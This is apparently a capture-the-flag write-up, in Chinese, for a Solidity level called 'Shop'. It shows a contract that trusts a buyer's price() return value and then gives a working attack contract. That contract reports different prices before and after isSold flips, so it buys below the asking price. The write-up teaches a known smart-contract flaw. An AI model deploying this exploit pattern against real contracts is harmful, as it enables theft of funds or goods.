# shop
## 題目
<img width="451" alt="截圖 2024-09-22 下午11 48 14" src="https://github.com/user-attachments/assets/adac9fa6-661d-40c7-9f29-e626353add4a">

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
有一個問題就是它在執行價格檢查和狀態變更時，會依賴於外部合約返回的價格資訊
## hack
我們可以寫一個攻擊合約，在合約的 price() 函數中使用不同的返回值：

1. 當 Shop 合約檢查價格時，返回一個大於等於 100 的值，以通過檢查。
2. 在狀態變更為 isSold = true 後，返回一個較低的值來更新 price，實現以低價購買商品。
```solidity
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract Hack {
    IShop private immutable target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function pwn() external {
        target.buy();
        require(target.price() == 99, "price != 99");
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}
```
